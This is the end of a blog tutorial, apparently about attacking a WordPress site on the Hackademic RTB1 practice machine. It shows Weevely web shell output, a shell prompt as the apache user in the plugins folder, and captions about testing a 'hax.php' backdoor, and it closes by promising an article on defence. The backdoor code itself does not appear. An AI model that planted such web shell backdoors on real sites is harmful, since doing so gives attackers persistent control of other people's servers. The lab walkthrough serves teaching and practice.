`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Website: <a href="http://code.google.com/p/weevely/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://code.google.com/p/weevely/</a> `





`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Using method 'system()'. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Retrieving terminal basic environment variables . `





`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[apache@HackademicRTB1 /var/www/html/Hackademic_RTB1/wp-content/plugins]`

 

  

 

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan53-300x56.png)

Testing our hax.php backdoor

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan54-300x55.png)

## Conclusion:

In this article we learned some techniques that are being used by hackers to target and hack your site and your server. I hope you liked this article and enjoyed it.

In next article we will learn how we can secure your site from these attacks and more, so your website will be very secured against many hacker attacks, even advanced ones!

 

Go to our new site- shankee.com
